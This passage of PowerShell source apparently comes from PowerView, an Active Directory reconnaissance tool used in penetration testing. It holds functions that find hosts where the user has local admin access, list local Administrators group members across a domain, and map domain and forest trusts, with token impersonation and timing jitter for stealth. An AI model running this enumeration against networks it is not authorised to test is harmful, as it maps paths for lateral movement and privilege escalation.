        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    # check if the current user has local admin access to this server
                    $Access = Test-AdminAccess -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-LocalAdminAccess] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-LocalAdminAccess] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainLocalGroupMember {
<#
.SYNOPSIS

Enumerates the members of specified local group (default administrators)
for all the targeted machines on the current (or specified) domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Invoke-UserImpersonation, Invoke-RevertToSelf, Get-NetLocalGroupMember, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and enumerates the members of the specified local
group (default of Administrators) for each machine using Get-NetLocalGroupMember.
By default, the API method is used, but this can be modified with '-Method winnt'
to use the WinNT service provider.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. "LDAP://OU=secret,DC=testlab,DC=local". Useful for OU queries.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to "Administrators".

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain and target systems.

.PARAMETER Delay

Specifies the delay (in seconds) between enumerating hosts, defaults to 0.

.PARAMETER Jitter

Specifies the jitter (0-1.0) to apply to any specified -Delay, defaults to +/- 0.3

.PARAMETER Threads

The number of threads to use for user searching, defaults to 20.

.EXAMPLE

Find-DomainLocalGroupMember

Enumerates the local group memberships for all reachable machines in the current domain.

.EXAMPLE

Find-DomainLocalGroupMember -Domain dev.testlab.local

Enumerates the local group memberships for all reachable machines the dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-DomainLocalGroupMember -Domain testlab.local -Credential $Cred

Enumerates the local group memberships for all reachable machines the dev.testlab.local
domain using the alternate credentials.

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        $Method = 'API',

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['ComputerName']) {
            $TargetComputers = $ComputerName
        }
        else {
            Write-Verbose '[Find-DomainLocalGroupMember] Querying computers in the domain'
            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length)"
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainLocalGroupMember] No hosts found to enumerate'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            # Add check if user defaults to/selects "Administrators"
            if ($GroupName -eq "Administrators") {
                $AdminSecurityIdentifier = New-Object System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split "\\")[-1]
            }

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        'ComputerName' = $TargetComputer
                        'Method' = $Method
                        'GroupName' = $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count)"
            Write-Verbose "[Find-DomainLocalGroupMember] Delay: $Delay, Jitter: $Jitter"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            Write-Verbose "[Find-DomainLocalGroupMember] Using threading with threads: $Threads"

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'GroupName' = $GroupName
                'Method' = $Method
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


########################################################
#
# Domain trust functions below.
#
########################################################

function Get-DomainTrust {
<#
.SYNOPSIS

Return all domain trusts for the current domain or a specified domain.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainSearcher, Get-DomainSID, PSReflect  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
domain using a number of methods. By default, and LDAP search using the filter
'(objectClass=trustedDomain)' is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead.

.PARAMETER Domain

Specifies the domain to query for trusts, defaults to the current domain.

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the built-in
.NET methods.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrust

Return domain trusts for the current domain using built in .LDAP methods.

.EXAMPLE

Get-DomainTrust -NET -Domain "prod.testlab.local"

Return domain trusts for the "prod.testlab.local" domain using .NET methods

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainTrust -Domain "prod.testlab.local" -Server "PRIMARY.testlab.local" -Credential $Cred

Return domain trusts for the "prod.testlab.local" domain enumerated through LDAP
queries, binding to the PRIMARY.testlab.local server for queries, and using the specified
alternate credenitals.

.EXAMPLE

Get-DomainTrust -API -Domain "prod.testlab.local"

Return domain trusts for the "prod.testlab.local" domain enumerated through API calls.

.OUTPUTS

PowerView.DomainTrust.LDAP

Custom PSObject with translated domain LDAP trust result fields (default).

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods.

PowerView.DomainTrust.API

Custom PSObject with translated domain API trust result fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,

        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $TrustAttributes = @{
            [uint32]'0x00000001' = 'NON_TRANSITIVE'
            [uint32]'0x00000002' = 'UPLEVEL_ONLY'
            [uint32]'0x00000004' = 'FILTER_SIDS'
            [uint32]'0x00000008' = 'FOREST_TRANSITIVE'
            [uint32]'0x00000010' = 'CROSS_ORGANIZATION'
            [uint32]'0x00000020' = 'WITHIN_FOREST'
            [uint32]'0x00000040' = 'TREAT_AS_EXTERNAL'
            [uint32]'0x00000080' = 'TRUST_USES_RC4_ENCRYPTION'
            [uint32]'0x00000100' = 'TRUST_USES_AES_KEYS'
            [uint32]'0x00000200' = 'CROSS_ORGANIZATION_NO_TGT_DELEGATION'
            [uint32]'0x00000400' = 'PIM_TRUST'
        }

        $LdapSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $LdapSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $LdapSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['Properties']) { $LdapSearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $LdapSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $LdapSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $LdapSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $LdapSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $LdapSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $LdapSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $LdapSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PsCmdlet.ParameterSetName -ne 'API') {
            $NetSearcherArguments = @{}
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                if ($PSBoundParameters['Credential']) {
                    $SourceDomain = (Get-Domain -Credential $Credential).Name
                }
                else {
                    $SourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif ($PsCmdlet.ParameterSetName -ne 'NET') {
            if ($Domain -and $Domain.Trim() -ne '') {
                $SourceDomain = $Domain
            }
            else {
                $SourceDomain = $Env:USERDNSDOMAIN
            }
        }

        if ($PsCmdlet.ParameterSetName -eq 'LDAP') {
            # if we're searching for domain trusts through LDAP/ADSI
            $TrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            $SourceSID = Get-DomainSID @NetSearcherArguments

            if ($TrustSearcher) {

                $TrustSearcher.Filter = '(objectClass=trustedDomain)'

                if ($PSBoundParameters['FindOne']) { $Results = $TrustSearcher.FindOne() }
                else { $Results = $TrustSearcher.FindAll() }
                $Results | Where-Object {$_} | ForEach-Object {
                    $Props = $_.Properties
                    $DomainTrust = New-Object PSObject

                    $TrustAttrib = @()
                    $TrustAttrib += $TrustAttributes.Keys | Where-Object { $Props.trustattributes[0] -band $_ } | ForEach-Object { $TrustAttributes[$_] }

                    $Direction = Switch ($Props.trustdirection) {
                        0 { 'Disabled' }
                        1 { 'Inbound' }
                        2 { 'Outbound' }
                        3 { 'Bidirectional' }
                    }

                    $TrustType = Switch ($Props.trusttype) {
                        1 { 'WINDOWS_NON_ACTIVE_DIRECTORY' }
                        2 { 'WINDOWS_ACTIVE_DIRECTORY' }
                        3 { 'MIT' }
                    }

                    $Distinguishedname = $Props.distinguishedname[0]
                    $SourceNameIndex = $Distinguishedname.IndexOf('DC=')
                    if ($SourceNameIndex) {
                        $SourceDomain = $($Distinguishedname.SubString($SourceNameIndex)) -replace 'DC=','' -replace ',','.'
                    }
                    else {
                        $SourceDomain = ""
                    }

                    $TargetNameIndex = $Distinguishedname.IndexOf(',CN=System')
                    if ($SourceNameIndex) {
                        $TargetDomain = $Distinguishedname.SubString(3, $TargetNameIndex-3)
                    }
                    else {
                        $TargetDomain = ""
                    }

                    $ObjectGuid = New-Object Guid @(,$Props.objectguid[0])
                    $TargetSID = (New-Object System.Security.Principal.SecurityIdentifier($Props.securityidentifier[0],0)).Value

                    $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                    $DomainTrust | Add-Member Noteproperty 'TargetName' $Props.name[0]
                    # $DomainTrust | Add-Member Noteproperty 'TargetGuid' "{$ObjectGuid}"
                    $DomainTrust | Add-Member Noteproperty 'TrustType' $TrustType
                    $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $($TrustAttrib -join ',')
                    $DomainTrust | Add-Member Noteproperty 'TrustDirection' "$Direction"
                    $DomainTrust | Add-Member Noteproperty 'WhenCreated' $Props.whencreated[0]
                    $DomainTrust | Add-Member Noteproperty 'WhenChanged' $Props.whenchanged[0]
                    $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.LDAP')
                    $DomainTrust
                }
                if ($Results) {
                    try { $Results.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainTrust] Error disposing of the Results object: $_"
                    }
                }
                $TrustSearcher.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            # if we're searching for domain trusts through Win32 API functions
            if ($PSBoundParameters['Server']) {
                $TargetDC = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                $TargetDC = $Domain
            }
            else {
                # see https://msdn.microsoft.com/en-us/library/ms675976(v=vs.85).aspx for default NULL behavior
                $TargetDC = $Null
            }

            # arguments for DsEnumerateDomainTrusts
            $PtrInfo = [IntPtr]::Zero

            # 63 = DS_DOMAIN_IN_FOREST + DS_DOMAIN_DIRECT_OUTBOUND + DS_DOMAIN_TREE_ROOT + DS_DOMAIN_PRIMARY + DS_DOMAIN_NATIVE_MODE + DS_DOMAIN_DIRECT_INBOUND
            $Flags = 63
            $DomainCount = 0

            # get the trust information from the target server
            $Result = $Netapi32::DsEnumerateDomainTrusts($TargetDC, $Flags, [ref]$PtrInfo, [ref]$DomainCount)

            # Locate the offset of the initial intPtr
            $Offset = $PtrInfo.ToInt64()

            # 0 = success
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # Work out how much to increment the pointer by finding out the size of the structure
                $Increment = $DS_DOMAIN_TRUSTS::GetSize()

                # parse all the result structures
                for ($i = 0; ($i -lt $DomainCount); $i++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $DS_DOMAIN_TRUSTS

                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment

                    $SidString = ''
                    $Result = $Advapi32::ConvertSidToStringSid($Info.DomainSid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if ($Result -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                    }
                    else {
                        $DomainTrust = New-Object PSObject
                        $DomainTrust | Add-Member Noteproperty 'SourceName' $SourceDomain
                        $DomainTrust | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $DomainTrust | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $DomainTrust | Add-Member Noteproperty 'Flags' $Info.Flags
                        $DomainTrust | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $DomainTrust | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $DomainTrust | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $DomainTrust | Add-Member Noteproperty 'TargetSid' $SidString
                        $DomainTrust | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $DomainTrust.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $DomainTrust
                    }
                }
                # free up the result buffer
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
        else {
            # if we're searching for domain trusts through .NET methods
            $FoundDomain = Get-Domain @NetSearcherArguments
            if ($FoundDomain) {
                $FoundDomain.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}


function Get-ForestTrust {
<#
.SYNOPSIS

Return all forest trusts for the current forest or a specified forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
forest using number of method using the .NET method GetAllTrustRelationships() on a
System.DirectoryServices.ActiveDirectory.Forest returned by Get-Forest.

.PARAMETER Forest

Specifies the forest to query for trusts, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestTrust

Return current forest trusts.

.EXAMPLE

Get-ForestTrust -Forest "external.local"

Return trusts for the "external.local" forest.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestTrust -Forest "external.local" -Credential $Cred

Return trusts for the "external.local" forest using the specified alternate credenitals.

.OUTPUTS

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods (default).
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        $NetForestArguments = @{}
        if ($PSBoundParameters['Forest']) { $NetForestArguments['Forest'] = $Forest }
        if ($PSBoundParameters['Credential']) { $NetForestArguments['Credential'] = $Credential }

        $FoundForest = Get-Forest @NetForestArguments

        if ($FoundForest) {
            $FoundForest.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}


function Get-DomainForeignUser {
<#
.SYNOPSIS

Enumerates users who are in groups outside of the user's domain.
This is a domain's "outgoing" access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser  

.DESCRIPTION

Uses Get-DomainUser to enumerate all users for the current (or target) domain,
then calculates the given user's domain name based on the user's distinguishedName.
This domain name is compared to the queried domain, and the user object is
output if they differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignUser

Return all users in the current domain who are in groups not in the
current domain.

.EXAMPLE

Get-DomainForeignUser -Domain dev.testlab.local

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainForeignUser -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential $Cred

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain, binding to the secondary.dev.testlab.local for queries, and
using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignUser

Custom PSObject with translated user property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{}
